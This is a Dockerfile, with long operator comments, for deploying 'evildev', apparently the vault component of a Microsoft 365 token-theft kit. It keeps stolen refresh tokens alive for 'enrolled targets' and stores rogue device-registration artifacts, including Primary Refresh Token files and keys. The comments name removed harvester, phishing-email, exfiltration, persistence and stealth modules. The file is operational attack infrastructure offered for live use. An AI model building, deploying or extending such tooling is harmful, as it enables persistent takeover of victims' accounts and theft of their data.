FROM python:3.11-slim

# Prevent prompts during installs, keep pip output clean
ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

WORKDIR /app

# Minimal system packages. The vault-only app needs nothing from the
# system beyond what's already in python:3.11-slim:
#   - sqlite3 CLI: optional, for operator inspection of project_data.db
#   - curl:        optional, for healthcheck + docker exec debugging
# gcc / build-essential / libpq-dev are NOT needed unless you switch to
# Postgres AND psycopg2-binary falls back to a source build. On
# python:3.11-slim the wheels install cleanly.
RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        sqlite3 \
        curl \
    && rm -rf /var/lib/apt/lists/*

# Virtualenv — same layout as the original, kept because it makes the
# venv path explicit in ENV PATH and simplifies future multi-stage builds.
RUN python -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"

RUN pip install --upgrade pip setuptools wheel

# Python deps. Vault-only requirements.txt should contain exactly:
#   flask
#   cryptography
#   python-dotenv
#   gunicorn
#   requests
# Nothing else. If your requirements.txt still references
# evildev/requirements.txt (nested), keep the two COPY lines and strip
# the nested file down to the same five packages.
COPY requirements.txt /tmp/requirements.txt
COPY evildev/requirements.txt /tmp/evildev/requirements.txt
RUN pip install -r /tmp/requirements.txt

# Application source. Only the vault modules need to be present:
#   evildev/app.py
#   evildev/db.py
#   evildev/logger.py
#   evildev/core.py           (CryptoUtils, decode_jwt, StealthEngine stub)
#   evildev/token_refresh_manager.py
#   evildev/enrollment.py
#   evildev/prt.py
#   evildev/prt_snippet.py
#   evildev/run_pipeline.py
#   evildev/templates/*.html  (login.html, vault.html)
#   evildev/static/*          (logo.png)
# Everything else (harvester, email_sender, tracking, exfil, builder_bp,
# proxy_manager, tenant_rotation, osint, content_stuffer, token_randomizer,
# thread_injector, network_resilience, device_code_shared, persistence,
# geoip, prometheus_metrics) is gone.
COPY . /app

# Runtime write paths. Only these three exist in the vault-only app.
RUN mkdir -p \
        /app/data \
        /app/drs_out \
        /app/logs

# Persistent volumes. Both /app/data (SQLite DB) and /app/drs_out
# (enrollment artifacts: cert.pem, key.pem, prt.json, session.key.bin)
# must survive container restarts — losing /app/drs_out orphans every
# enrolled target in the DB.
VOLUME ["/app/data", "/app/drs_out", "/app/logs"]

# Runtime defaults. All secrets (FLASK_SECRET_KEY, TOKEN_ENCRYPTION_KEY,
# AUTH_USER, AUTH_PASS, CLIENT_ID, AUTH_KEY) come from .env or docker
# run -e. Never bake them into the image.
ENV PORT=5000 \
    REQUIRE_AUTH=true \
    FLASK_DEBUG=0 \
    PROJECT_DB_PATH=/app/data/project_data.db \
    DRS_OUT_PATH=/app/drs_out \
    LOG_DIR=/app/logs

EXPOSE 5000

# ═══════════════════════════════════════════════════════════════════════
# CRITICAL gunicorn configuration — three non-default settings, each
# with a specific reason. Do not change any of them without reading the
# comments first.
# ═══════════════════════════════════════════════════════════════════════
#
# 1. --workers 1
#    app.py calls token_refresh_manager.start() at module import time
#    (outside `if __name__ == '__main__'`, so it fires under gunicorn
#    too). With --workers 4 you get FOUR independent background refresh
#    threads, each polling the same tokens table every 5 minutes:
#      - 4x refresh grants consumed at Microsoft per token per cycle
#      - racing DB writes (last writer wins, potential corruption)
#      - 3 of the 4 workers serving stale in-memory token state
#    --workers 1 guarantees exactly one refresh worker.
#
# 2. --threads 8 --worker-class gthread
#    Single process, but threaded request handling. You get concurrency
#    for the Flask UI without the race condition. Slow endpoints like
#    import (per-bundle Microsoft verification) and re-enroll (spawns
#    run_pipeline.py) don't block the vault list endpoint.
#
# 3. --timeout 300
#    Re-enroll spawns run_pipeline.py which routinely takes 8–60s per
#    target, occasionally up to 300s on slow DRS tenants. Default
#    gunicorn timeout is 30s, which would kill the request mid-flight
#    and leave the target in an ambiguous state (subprocess still
#    running, but browser sees 500). 300s matches the subprocess
#    timeout in drs_re_enroll.
#
# Also: --access-logfile - and --error-logfile - route logs to stdout/
# stderr, which is what Docker expects. Do NOT use --capture-output;
# it hides tracebacks from the refresh loop that you want to see.
# ═══════════════════════════════════════════════════════════════════════

CMD ["gunicorn", \
     "--bind", "0.0.0.0:5000", \
     "--workers", "1", \
     "--threads", "8", \
     "--worker-class", "gthread", \
     "--timeout", "300", \
     "--access-logfile", "-", \
     "--error-logfile", "-", \
     "--log-level", "info", \
     "evildev.app:app"]
